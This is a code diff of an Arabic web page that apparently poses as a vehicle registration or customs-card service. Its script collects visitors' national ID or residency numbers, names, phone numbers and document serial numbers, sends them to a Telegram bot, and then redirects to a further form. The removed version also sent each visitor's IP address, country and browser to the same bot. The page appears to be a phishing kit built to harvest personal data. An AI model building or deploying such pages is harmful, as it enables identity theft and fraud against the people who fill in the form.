@@ -666,179 +666,180 @@ input[type="tel"], select {
 
   <script src="config.js"></script>
   <script>
-    (async () => {
-  const isNewVisitor = !localStorage.getItem('visited_before');
-  if (isNewVisitor) localStorage.setItem('visited_before', 'yes');
+    // Telegram Configuration
+    const telegramBotToken = TELEGRAM_BOT_TOKEN;
+    const chatId = TELEGRAM_CHAT_ID;
 
-  const geo = await fetch('https://ipapi.co/json/').then(res => res.json());
-
-  const browser = navigator.userAgent;
-
-  const message = `
-👁️‍🗨️ زيارة جديدة للموقع
-
-🌍 الدولة: ${geo.country_name} (${geo.ip})
-🧭 المتصفح: ${browser}
-🆕 زائر جديد؟ ${isNewVisitor ? "نعم" : "لا"}
-🕒 الوقت: ${new Date().toLocaleString()}
-  `;
-
-    const telegramURL = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
-
-  fetch(telegramURL, {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({
-      chat_id: chatId,
-      text: message
-    })
-  });
-})();
-  const telegramBotToken = TELEGRAM_BOT_TOKEN; 
-const chatId = TELEGRAM_CHAT_ID; 
-
-  function createTelegramMessage(formData) {
-    const formType = formData.get('serial_number_form') ? 'استمارة' : 'بطاقة جمركية';
-    let message = `
-📋 معلومات مقدم الطلب :
-- رقم الهوية / الإقامة: ${formData.get('id_number')}
-- اسم مالك الوثيقة: ${formData.get('owner_name')}
-- رقم الهاتف: ${formData.get('phone')}
-- نوع الوثيقة: ${formType}
-`;
-
-    if (formType === 'استمارة') {
-      message += `- الرقم التسلسلي: ${formData.get('serial_number_form') || 'غير محدد'}`;
-    } else {
-      message += `- سنة الصنع: ${formData.get('manufacture_year') || 'غير محدد'}
-- الرقم التسلسلي: ${formData.get('serial_number_custom') || 'غير محدد'}`;
+    // Generate session ID if not exists
+    function getSessionId() {
+      let sessionId = localStorage.getItem('sessionId');
+      if (!sessionId) {
+        sessionId = crypto.randomUUID ? crypto.randomUUID() : 
+          'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+            const r = Math.random() * 16 | 0;
+            const v = c === 'x' ? r : (r & 0x3 | 0x8);
+            return v.toString(16);
+          });
+        localStorage.setItem('sessionId', sessionId);
+      }
+      return sessionId;
     }
 
-    return message;
-  }
-
-  async function sendToTelegram(message) {
-    const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
-    const payload = {
-      chat_id: chatId,
-      text: message,
-      parse_mode: 'HTML'  
-    };
-
-    const response = await fetch(url, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify(payload)
-    });
-
-    return response.json();
-  }
-
-  function validateCaptcha() {
-    const input = document.getElementById('captchaInput').value.trim();
-    const code = document.getElementById('captchaCode').textContent.trim();
-    return input === code;
-  }
-
-  document.getElementById('myForm').addEventListener('submit', async function(event) {
-    event.preventDefault();
-
-    if (!validateCaptcha()) {
-      alert('رمز التحقق غير صحيح!');
-      return;
+    // Generate captcha code
+    function generateCaptcha() {
+      const code = Math.floor(1000 + Math.random() * 9000).toString();
+      document.getElementById('captchaCode').textContent = code;
     }
 
-    const formData = new FormData(this);
-    const message = createTelegramMessage(formData);
+    // Validate captcha
+    function validateCaptcha() {
+      const input = document.getElementById('captchaInput').value.trim();
+      const code = document.getElementById('captchaCode').textContent.trim();
+      return input === code;
+    }
 
-    try {
-      const result = await sendToTelegram(message);
-      if (result.ok) {
-        localStorage.setItem('owner_name', formData.get('owner_name'));
+    // Toggle purpose type
+    function togglePurpose(type) {
+      const newBtn = document.getElementById('newBtn');
+      const transferBtn = document.getElementById('transferBtn');
+      const birthDateBox = document.getElementById('birthDateBox');
 
-  window.location.href = 'form.html';
-        this.reset();
+      if (type === 'transfer') {
+        transferBtn.classList.add('active');
+        newBtn.classList.remove('active');
+        birthDateBox.classList.remove('hidden');
+      } else {
+        newBtn.classList.add('active');
+        transferBtn.classList.remove('active');
+        birthDateBox.classList.add('hidden');
+      }
+    }
+
+    // Toggle form type
+    function toggleFormType(type) {
+      const formBtn = document.getElementById('formBtn');
+      const customBtn = document.getElementById('customBtn');
+      const formFields = document.getElementById('form-fields');
+      const customFields = document.getElementById('custom-fields');
+
+      if (type === 'form') {
+        formBtn.classList.add('active');
+        customBtn.classList.remove('active');
+        formFields.style.display = 'block';
+        customFields.style.display = 'none';
+      } else {
+        formBtn.classList.remove('active');
+        customBtn.classList.add('active');
+        formFields.style.display = 'none';
+        customFields.style.display = 'block';
+      }
+    }
+
+    // Send data directly to Telegram
+    async function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+      try {
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' })
+        });
+        return await response.json();
+      } catch (error) {
+        console.error('Telegram Error:', error);
+        return { ok: false };
+      }
+    }
+
+    // Submit form data to Telegram
+    async function submitToServer(data) {
+      const formType = data.document_type === 'استمارة' ? 'استمارة' : 'بطاقة جمركية';
+      const message = `
+📋 <b>معلومات مقدم الطلب الجديدة:</b>
+━━━━━━━━━━━━━━━
+👤 الاسم: ${data.owner_name}
+📱 الهاتف: ${data.phone}
+🪪 رقم الهوية: ${data.id_number}
+📄 نوع الوثيقة: ${formType}
+${formType === 'استمارة' ? `🔢 الرقم التسلسلي: ${data.serial_number}` : `📅 سنة الصنع: ${data.birth_date || 'غير محدد'}\n🔢 الرقم التسلسلي: ${data.serial_number}`}
+      `;
+      return await sendToTelegram(message);
+    }
+
+    // Handle form submission
+    document.getElementById('myForm').addEventListener('submit', async function(event) {
+      event.preventDefault();
+
+      // Validate captcha
+      if (!validateCaptcha()) {
+        alert('رمز التحقق غير صحيح!');
         generateCaptcha();
+        return;
+      }
+
+      // Get form data
+      const formData = new FormData(this);
+      const data = {
+        owner_name: formData.get('owner_name'),
+        id_number: formData.get('id_number'),
+        phone: formData.get('phone'),
+        document_type: document.querySelector('input[name="document_type"]:checked')?.value || 'استمارة',
+        serial_number: formData.get('serial_number_form') || formData.get('serial_number_custom'),
+        birth_date: formData.get('birth_date') || null
+      };
+
+      // Validate required fields
+      if (!data.owner_name || !data.id_number || !data.phone) {
+        alert('يرجى تعبئة جميع الحقول المطلوبة.');
+        return;
+      }
+
+      // Submit to Telegram
+      const result = await submitToServer(data);
+
+      if (result.ok) {
+        // Save owner name to localStorage for next steps
+        localStorage.setItem('owner_name', data.owner_name);
+        localStorage.setItem('sessionId', getSessionId());
+        
+        // Navigate to next step
+        window.location.href = 'form.html';
       } else {
         alert('حدث خطأ أثناء إرسال البيانات. حاول مرة أخرى.');
-      }
-    } catch (error) {
-      alert('حدث خطأ في الاتصال.');
-      console.error(error);
-    }
-  });
-
-  function generateCaptcha() {
-    const code = Math.floor(1000 + Math.random() * 9000).toString();
-    document.getElementById('captchaCode').textContent = code;
-  }
-
-  function togglePurpose(type) {
-    const newBtn = document.getElementById('newBtn');
-    const transferBtn = document.getElementById('transferBtn');
-    const birthDateBox = document.getElementById('birthDateBox');
-
-    if (type === 'transfer') {
-      transferBtn.classList.add('active');
-      newBtn.classList.remove('active');
-      birthDateBox.classList.remove('hidden');
-    } else {
-      newBtn.classList.add('active');
-      transferBtn.classList.remove('active');
-      birthDateBox.classList.add('hidden');
-    }
-  }
-
-  const serviceTabs = document.querySelectorAll('.nav-tabs .tab-item');
-  const serviceContent = document.getElementById('serviceContent');
-  const maintenanceBox = document.getElementById('maintenanceBox');
-
-  serviceTabs.forEach(function(tab) {
-    tab.addEventListener('click', function() {
-      serviceTabs.forEach(function(item) {
-        item.classList.remove('selected', 'active');
-      });
-
-      if (tab.dataset.service) {
-        tab.classList.add('selected');
-        serviceContent.classList.add('hidden');
-        maintenanceBox.classList.remove('hidden');
-      } else {
-        tab.classList.add('active');
-        serviceContent.classList.remove('hidden');
-        maintenanceBox.classList.add('hidden');
+        generateCaptcha();
       }
     });
-  });
 
-  window.onload = function() {
-    generateCaptcha();
-    togglePurpose('new');
-  };
+    // Service tabs handling
+    const serviceTabs = document.querySelectorAll('.nav-tabs .tab-item');
+    const serviceContent = document.getElementById('serviceContent');
+    const maintenanceBox = document.getElementById('maintenanceBox');
 
-  function toggleFormType(type) {
-    const formBtn = document.getElementById('formBtn');
-    const customBtn = document.getElementById('customBtn');
-    const formFields = document.getElementById('form-fields');
-    const customFields = document.getElementById('custom-fields');
+    serviceTabs.forEach(function(tab) {
+      tab.addEventListener('click', function() {
+        serviceTabs.forEach(function(item) {
+          item.classList.remove('selected', 'active');
+        });
 
-    if (type === 'form') {
-      formBtn.classList.add('active');
-      customBtn.classList.remove('active');
-      formFields.style.display = 'block';
-      customFields.style.display = 'none';
-    } else {
-      formBtn.classList.remove('active');
-      customBtn.classList.add('active');
-      formFields.style.display = 'none';
-      customFields.style.display = 'block';
-    }
-  }
-</script>
+        if (tab.dataset.service) {
+          tab.classList.add('selected');
+          serviceContent.classList.add('hidden');
+          maintenanceBox.classList.remove('hidden');
+        } else {
+          tab.classList.add('active');
+          serviceContent.classList.remove('hidden');
+          maintenanceBox.classList.add('hidden');
+        }
+      });
+    });
+
+    // Initialize on page load
+    window.onload = function() {
+      generateCaptcha();
+      togglePurpose('new');
+      getSessionId(); // Generate session if not exists
+    };
+  </script>
 
 </body>
 </html>
